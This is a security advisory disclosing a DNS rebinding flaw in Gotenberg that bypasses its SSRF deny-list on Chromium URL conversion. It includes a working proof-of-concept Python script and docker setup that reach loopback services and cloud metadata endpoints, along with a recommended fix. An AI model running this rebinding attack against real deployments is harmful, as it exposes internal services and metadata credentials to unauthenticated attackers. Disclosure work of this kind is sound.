# [M] Gotenberg's DNS rebinding bypasses SSRF validation on Chromium URL conversion routes

## Summary
Severity: Medium
Advisory: GHSA-2pmr-289p-44r3
CVE: CVE-2026-42592
CWE: CWE-367, CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-2pmr-289p-44r3
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0

## Details
## Summary

`FilterOutboundURL` resolves the hostname, checks the resolved IPs against the private-address deny-list, and returns only the error. It discards the resolved addresses. Chromium later performs its own DNS resolution when it navigates to the URL. An attacker who controls DNS for a hostname with a short TTL returns a public IP on the first query (Gotenberg allows) and a private IP on the second query (Chromium connects to the attacker-chosen internal address). The CDP `Fetch.requestPaused` handler re-checks the URL but runs its own DNS resolution, leaving a timing window before Chromium's actual TCP connect. The rendered internal service response returns to the caller as a PDF.

## Details

`pkg/gotenberg/outbound.go:227-230` drops the pinned IPs from the outbound decision:

```go
func FilterOutboundURL(ctx context.Context, rawURL string, allowList, denyList []*regexp2.Regexp, deadline time.Time) error {
    _, err := decideOutbound(ctx, rawURL, allowList, denyList, deadline)
    return err
}
```

The Chromium convert path at `pkg/modules/chromium/browser.go:341` calls `FilterOutboundURL(ctx, url, b.arguments.allowList, b.arguments.denyList, deadline)` and, on success, hands the raw URL string to Chromium via CDP. Chromium's network stack issues its own DNS lookup for the hostname, independent of Go's resolver.

The CDP `Fetch.requestPaused` listener at `pkg/modules/chromium/events.go:55` runs a second check:

```go
err := gotenberg.FilterOutboundURL(ctx, e.Request.URL, options.allowList, options.denyList, deadline)
```

This also calls `decideOutbound`, which again resolves DNS, checks, and returns only the error. After the handler calls `fetch.ContinueRequest` at line 101, Chromium proceeds to the actual TCP connect and resolves DNS one more time. Between the second check and the connect, the DNS answer can change.

The webhook and downloadFrom paths avoid this class by using `gotenberg.NewOutboundHttpClient` at `pkg/gotenberg/outbound.go:269-280`, which wires a `secureDialContext` that pins resolved IPs through `dialPinned`. The Chromium navigation path has no equivalent. The `--chromium-host-resolver-rules` flag at `pkg/modules/chromium/chromium.go:446` defaults to empty, so no operator-provided mapping closes the gap in default deployments.

## Proof of Concept

Reproduction uses a public DNS service that randomizes the response per query. `rebind.<subdomain>.requestrepo.com` resolves to `<public-ip>` or `127.0.0.1` with 50/50 probability per lookup. The attacker selects a subdomain and configures it to return `<public-ip>%127.0.0.1`.

Setup:

```bash
docker run -d --name gotenberg-poc -p 3000:3000 gotenberg/gotenberg:8

# Simulate an internal-only HTTP service that the default deny-list blocks.
docker exec gotenberg-poc sh -c \
    'mkdir -p /tmp/rebind_srv && \
     echo "<h1>INTERNAL-ONLY-REBIND-HIT</h1>" > /tmp/rebind_srv/index.html'
docker exec -d gotenberg-poc sh -c \
    'cd /tmp/rebind_srv && python3 -m http.server 80 --bind 127.0.0.1'
```

Alice runs the attack without auth:

```python
import requests, subprocess
T = "http://localhost:3000"
REBIND = "http://rebind.<subdomain>.requestrepo.com/"
MARKER = "INTERNAL-ONLY-REBIND-HIT"

hits = 0
for i in range(20):
    r = requests.post(
        f"{T}/forms/chromium/convert/url",
        files={"url": (None, REBIND)},
        timeout=30,
    )
    if r.status_code != 200:
        continue
    open("/tmp/_r.pdf", "wb").write(r.content)
    txt = subprocess.run(
        ["pdftotext", "/tmp/_r.pdf", "-"],
        capture_output=True, text=True,
    ).stdout
    if MARKER in txt:
        hits += 1

print(f"{hits}/20 rebind hits")
```

Observed output against gotenberg 8.31.0:

```
2/20 rebind hits
```

The marker renders in the attacker's PDF output. `127.0.0.1:80` serves that byte pattern only inside the container; the public IP the rebind service alternates with serves unrelated content. The attacker confirms the TCP connect reached loopback, not the public IP. Ten percent per-attempt success rate, trivially automated.

## Impact

An unauthenticated caller reaches HTTP services bound to the Gotenberg container's loopback interface, cloud metadata endpoints at `169.254.169.254`, and services on other private-network addresses. Gotenberg's deny-list blocks direct URL access to these ranges; DNS rebinding sidesteps the block. The rendered response returns as PDF output, letting the attacker read metadata tokens, internal admin interfaces, or sidecar service state depending on what the deployment runs on loopback. The attack requires controlling the DNS authority for one hostname, which is within an Internet attacker's normal capability. Each attempt succeeds about one time in ten; a handful of requests per target is enough.

## Recommended Fix

Pin the resolved IP from Gotenberg's `decideOutbound` check all the way to Chromium's connect. Export the existing `decideOutbound` function as `DecideOutbound`, then use the returned pinned IP to rewrite the Chromium navigation URL inside the `Fetch.requestPaused` handler via `fetch.ContinueRequest`. Set the `Host` header to the original hostname so TLS and virtual-host routing still work:

```go
decision, err := gotenberg.DecideOutbound(ctx, e.Request.URL, options.allowList, options.denyList, deadline)
if err != nil {
    allow = false
} else if len(decision.Pinned) > 0 {
    pinnedURL := rewriteHost(e.Request.URL, decision.Pinned[0].String())
    req := fetch.ContinueRequest(e.RequestID).WithURL(pinnedURL).WithHeaders(...)
}
```

Alternative: pass `--host-resolver-rules="MAP <hostname> <pinned-ip>"` to Chromium when starting the per-request session, derived from the `FilterOutboundURL` resolution. This is the same mechanism the `--chromium-host-resolver-rules` flag already exposes to operators, just applied automatically per request.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-2pmr-289p-44r3
- https://nvd.nist.gov/vuln/detail/CVE-2026-42592
- https://github.com/gotenberg/gotenberg
